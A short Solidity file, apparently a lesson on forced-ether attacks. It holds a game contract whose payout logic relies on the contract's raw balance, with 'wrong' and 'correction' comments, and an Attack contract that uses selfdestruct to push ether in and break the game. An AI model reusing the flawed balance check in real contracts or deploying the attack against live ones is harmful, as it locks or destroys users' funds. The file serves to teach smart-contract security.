// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

contract EtherStore {
    uint256 public targetAmount = 7 ether;
    address public winner;

    uint public balance;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 ether");
        // wrong
        balance = address(this).balance;
        // correction
        // balance+=msg.value
        require(balance <= targetAmount, "Game is Over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not Winner");
        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to sent Ether");
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
        // correction
        // return balance;
    }
}

contract Attack {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}
